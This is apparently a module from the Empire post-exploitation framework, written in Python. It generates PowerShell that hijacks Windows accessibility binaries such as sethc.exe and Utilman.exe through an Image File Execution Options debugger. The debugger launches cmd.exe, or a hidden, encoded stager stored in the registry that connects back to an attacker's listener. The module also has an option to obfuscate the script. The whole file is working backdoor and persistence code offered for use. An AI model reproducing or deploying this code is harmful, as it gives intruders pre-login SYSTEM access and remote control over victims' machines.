from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-AccessBinary',

            'Author': ['@harmj0y'],

            'Description': ("Sets the debugger for a specified target binary to be cmd.exe, "
                            "another binary of your choice, or a listern stager. This can be launched from "
                            "the ease-of-access center (ctrl+U)."),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [ ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'TargetBinary' : {
                'Description'   :   'Target binary to set the debugger for (sethc.exe, Utilman.exe, osk.exe, Narrator.exe, or Magnify.exe)',
                'Required'      :   True,
                'Value'         :   'sethc.exe'
            },
            'RegPath' : {
                'Description'   :   'Registry location to store the script code. Last element is the key name.',
                'Required'      :   False,
                'Value'         :   'HKLM:Software\Microsoft\Network\debug'
            },
            'Cleanup' : {
                'Description'   :   'Switch. Disable the Utilman.exe debugger.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'TriggerBinary' : {
                'Description'   :   'Binary to set for the debugger.',
                'Required'      :   False,
                'Value'         :   'C:\Windows\System32\cmd.exe'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # management options
        cleanup = self.options['Cleanup']['Value']        
        triggerBinary = self.options['TriggerBinary']['Value']
        listenerName = self.options['Listener']['Value']
        targetBinary = self.options['TargetBinary']['Value']

        # storage options
        regPath = self.options['RegPath']['Value']

        statusMsg = ""
        locationString = ""


        if cleanup.lower() == 'true':
            # the registry command to disable the debugger for Utilman.exe
            script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s';'%s debugger removed.'" %(targetBinary, targetBinary)
            if obfuscate:
                script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
            return script
        

        if listenerName != '':
            # if there's a listener specified, generate a stager and store it

            if not self.mainMenu.listeners.is_listener_valid(listenerName):
                # not a valid listener, return nothing for the script
                print helpers.color("[!] Invalid listener: " + listenerName)
                return ""

            else:
                # generate the PowerShell one-liner
                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell')
                
                encScript = launcher.split(" ")[-1]
                # statusMsg += "using listener " + listenerName

            path = "\\".join(regPath.split("\\")[0:-1])
            name = regPath.split("\\")[-1]

            statusMsg += " stored in " + regPath + "."

            script = "$RegPath = '"+regPath+"';"
            script += "$parts = $RegPath.split('\\');"
            script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
            script += "$name = $parts[-1];"
            script += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+encScript+";"

            # note where the script is stored
            locationString = "$((gp "+path+" "+name+")."+name+")"

            script += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';'"+targetBinary+" debugger set to trigger stager for listener "+listenerName+"'"

        else:
            # the registry command to set the debugger for the specified binary to be the binary path specified
            script = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '"+triggerBinary+"';'"+targetBinary+" debugger set to "+triggerBinary+"'"
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
